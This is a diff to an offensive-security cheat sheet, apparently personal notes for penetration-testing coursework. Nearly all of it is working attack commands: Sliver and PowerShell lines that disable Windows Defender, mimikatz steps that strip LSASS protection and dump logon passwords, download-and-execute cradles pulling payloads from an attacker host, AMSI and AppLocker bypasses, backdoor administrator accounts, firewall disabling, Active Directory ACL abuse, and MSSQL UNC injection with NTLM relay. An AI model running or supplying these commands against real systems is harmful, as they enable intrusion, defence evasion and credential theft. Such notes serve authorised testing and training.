@@ -132,7 +132,7 @@ sshuttle -r database_admin@192.168.238.63:2222 10.4.238.0/24 172.16.238.0/24
 
 ===ligolo
 #Listener
-sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;proxy -selfcert -laddr 0.0.0.0:443
+sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;sudo proxy -selfcert -laddr 0.0.0.0:443
 #Agent
 .\agent.exe -connect $LHOST:443 -ignore-cert
 #Listener
@@ -733,17 +733,17 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=80 -a x64 --platfor
 
 
 
-=========================================av-evasion==============================================
+=========================================AV==============================================
 ===av-enumeration===
 
 ===WinDefend
 Get-MpComputerStatus | findstr IoavProtectionEnabled
 
-===amsi
+===amsi-enumeration
 Get-Process -Module | Where-Object {$_.ModuleName -match "amsi"}
 echo "AmsiUtils"
 
-===LSA-PPL
+===lsa-ppl-enumeration
 Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'RunAsPPL'
 
 ===applocker-enumeration
@@ -756,15 +756,24 @@ Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> AppLoc
 #gpedit.msc
 Local Computer Policy -> Computer Configuration -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker
 
-===powershell-constrained-language (clm)
+===clm-enumeration
 $ExecutionContext.SessionState.LanguageMode
 sliver (CLM_ENUM) > sharpsh -t 20 -- '-c "$ExecutionContext.SessionState.LanguageMode"'
 
-===evasion===
+===av-evasion===
 ===disable-av
-"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
-Set-MpPreference -DisableIntrusionPreventionSystem $false -DisableIOAVProtection $false -DisableRealtimeMonitoring $false -Verbose
+PS C:\MpCmdRun> & 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
+sliver (DisableAV) > sharpsh -t 20 -- '-c "cmd /c \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All"'
+sliver (DisableAV) > sharpsh -t 20 -- -c \"Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true\"
 sliver (DefendersDeath) > sharpsh -t 20 -- -u 'http://$LHOST/serve/basics/DefendersDeath.ps1' -c 1
+
+===lsa-ppl-bypass
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+
+===in-mem-mimikatz
+(New-Object System.Net.WebClient).DownloadString('http://$LHOST/serve/basic/amsibypass.txt') | IEX
+(New-Object System.Net.WebClient).DownloadString('http://$LHOST/serve/basic/invmmk.txt') | IEX; Invoke-Mimikatz -Command "`"privilege::debug`" `"token::elevate`" `"!+`" `"!processprotect /process:lsass.exe /remove`" `"log mmk.log`" `"sekurlsa::logonpasswords`""
 
 ===run-in-memory
 (New-Object System.Net.WebClient).DownloadString('http://$LHOST/payload.txt') | IEX
@@ -773,24 +782,23 @@ sliver (SHELL) > execute-assembly /Stracciatella.exe -c "$ExecutionContext.Sessi
 #sliver-hollowing
 sliver (SHELL) > hollow svchost.exe /home/kali/sliver.x64.bin
 
-===amsi
+===clm-amsi-applocker-bypass
+#amsi-bypass
 (new-object system.net.webclient).downloadstring('http://$LHOST/serve/basic/amsibypass.txt') | IEX
 
-===bypass-lsa-ppl
-mimikatz # !+
-mimikatz # !processprotect /process:lsass.exe /remove
-
-===in-mem-mimikatz
-(New-Object System.Net.WebClient).DownloadString('http://$LHOST/serve/basic/amsibypass.txt') | IEX
-(New-Object System.Net.WebClient).DownloadString('http://$LHOST/serve/basic/invmmk.txt') | IEX; Invoke-Mimikatz -Command "`"privilege::debug`" `"token::elevate`" `"!+`" `"!processprotect /process:lsass.exe /remove`" `"log mmk.log`" `"sekurlsa::logonpasswords`""
-
-===applocker
-#rundll in trusted location
+#applocker-bypass
+##rundll in trusted location
 rundll32.exe C:\Windows\Tasks\TestDll.dll,run
-#alternate-data-stream ads
+##alternate-data-stream ads
 type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
 dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
 wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+
+#FullBypass
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj
+	#Start rrev listener
+	#Use in-memory-processes to avoid reverting to ConstrainedLanguage, Import-Module will revert
+	(New-Object System.Net.WebClient).DownloadString('http://$LHOST/serve/basic/pv.ps1') | IEX
 
 ===installutil
 1# create exec payload, put runner function into Uninstall function (Idk if Install also can)
@@ -815,7 +823,7 @@ bitsadmin /Transfer myJob http://$LHOST/file.txt C:\users\student\enc.txt && cer
 
 ===msbuild
 #use RedTeamPayloads\AppLockerBypass\MSBuild.xml (already embedded with c# code)
-C:\Windows\Microsoft.NET\Framework64\v4.0.303.19\MSBuild.exe c:\windows\temp\MSBuild.xml
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c:\windows\temp\MSBuild.xml
 
 ===mshta-hta
 c:\windows\system32\mshta.exe rev.hta
@@ -1231,7 +1239,7 @@ mimikatz '"token::elevate""log mmk.log" "vault::list" "exit"'
 mimikatz '"token::elevate" "vault::cred /patch" "exit"'
 
 #sliver-mimikatz
-sliver (mimikatz) > upload /mimidrv.sys c:\\windows\\temp\\
+sliver (mimikatz) > upload /serve/basic/mimidrv.sys c:\\windows\\temp\\
 sliver (mimikatz) > cd c:\\windows\\temp\\
 sliver (mimikatz) > mimikatz "\"privilege::debug\" \"token::elevate\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"log mmk.log\" \"sekurlsa::logonpasswords\""
 
@@ -1579,11 +1587,13 @@ impacket-ticketConverter tgt.kirbi tgt.ccache
 
 ================================persistence=====================================
 ===windows-add-user
+sliver (add-user) > sharpsh -- '-c "net user /add kali p@ssword123; net localgroup administrators kali /add; net localgroup \"remote desktop users\" kali /add"
 net user /add kali p@ssword123; net localgroup administrators kali /add; net localgroup 'remote desktop users' kali /add
 
 ===RDP===
 ===enable-rdp
-reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f; netsh advfirewall set allprofiles state off net localgroup 'remote desktop users' kali /add
+sliver (enable-rdp) > sharpsh -- '-c "reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f ; netsh advfirewall set allprofiles state off'
+reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f; netsh advfirewall set allprofiles state off
 
 ===rdp-pth
 New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value '0' -PropertyType DWORD -Force
@@ -1643,6 +1653,10 @@ nxc winrm target.com -u user -p password -x whoami
 nxc smb ... --use-kcache # KRB5CCNAME is set
 nxc smb ... --use-kcache --kcache-file /path/to/ticket.ccache
 
+===bloodyAD
+bloodyAD --host <DC01> -d <domain> -u <username> -p <password> <add/get/remove/set> <options...>
+bloodyAD --host <DC01> -d <domain> -u <username> -p <:hash> <add/get/remove/set> <options...>
+
 ===ldapsearch
 #get naming contexts
 ldapsearch -x -H ldap://$TARGET -s base namingcontexts
@@ -1694,7 +1708,8 @@ impacket-GetNPUsers target.pg/user:password -dc-ip dc01.ip
 $env:computername
 [wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
 
-===basic-enum
+===basic-Enum
+bloodyAD --host DC01 -d $domain -u <username> -p <password> / <:hash> get object <Target>
 PS C:\Powerview > Get-DomainComputer
 PS C:\Powerview > Get-NetComputer
 PS C:\Powerview > Get-NetGroup 'Group Name'
@@ -1831,15 +1846,18 @@ Asreproasting: https://book.hacktricks.xyz/windows-hardening/active-directory-me
 .\Rubeus.exe dump /nowrap
 .\Rubeus.exe ptt /ticket:doIFhDCCBYCgAwIBBaEDAgEW...
 
+===weak-acl(WriteDACL)
+#Add GenericAll 1st then, do the same as weak-acl(GenericAll)
+sliver (WriteDACL) > sharpview -- 'Add-DomainObjectAcl -TargetIdentity admins -PrincipalIdentity kali -Rights All'
+bloodyAD --host DC01 -d $domain -u <username> -p <password> / <:hash> add genericAll Target Grantee
+
 ===weak-acl(GenericAll)
 #Change target password
 net user Bob newpassword /domain
+bloodyAD --host DC01 -d $domain -u <username> -p <password> / <:hash> set password Target newpassword
 #Add self to group
 net group testgroup offsec /add /domain
-
-===weak-acl(WriteDACL)
-#Add GenericAll to self
-sliver (WriteDACL) > sharpview -- 'Add-DomainObjectAcl -TargetIdentity admins -PrincipalIdentity kali -Rights All'
+bloodyAD --host DC01 -d $domain -u <username> -p <password> / <:hash> add groupMember DomainGroup DomainUser
 
 ===weak-acl(GenericWrite) (Modify any writable attribute of that entity)
 #Add fake SPN, request a TGS, and crack offline
@@ -1958,12 +1976,19 @@ impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/
 nxc smb $RHOST -u jon.snow -p iknownothing --delegate Administrator
 
 ===mssql-unc-injection
-1. start smb server
+1 #responder-listener
 sudo responder -I tun0
-2. List smb share from target
+2 #unc-callback
 EXEC xp_dirtree '\\$LHOST\kali'
-#Using nxc 
+#nxc-unc
 nxc mssql dc01.corp1.com -u Offsec -p lab -q 'EXEC xp_dirtree '\\\\$LHOST\kali';'
+#sqlrecon-unc
+sliver (UNC_INJECTION) > sqlrecon -i -- /a:wintoken /h:sql07 /m:smb /unc:\\\\$LHOST\\kali
+#mssql-unc
+sliver (UNC_INJECTION) > mssqland -- /h:sql05 /c:token /a:smb "\\\\192.168.45.198\kali"
+
+#cracking-NTLMv2
+hashcat -m 5600 hash /wls/rockyou.txt --force
 
 #Clear responder's cached credentials
 sudo rm /usr/share/responder/Responder.db
@@ -1973,7 +1998,8 @@ sudo rm /usr/share/responder/Responder.db
 python3 -c 'import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://$LHOST/run.txt\\') | IEX'.encode('utf-16le')).decode())'
 
 2. NtlmRelayx Listener
-sudo impacket-ntlmrelayx --no-http-server -smb2support -t $LHOST -c 'powershell -enc <b64-payload>'
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t $RHOST -c 'powershell -enc <b64-payload>'
+sudo impacket-ntlmrelayx --no-http-server -smb2support -tf targets.txt -c 'powershell -enc <b64-payload>'
 
 3. UNC Injection to force NTLM authentication + Hash Relay Authentication + command execution
 xp_dirtree \\$LHOST\kali
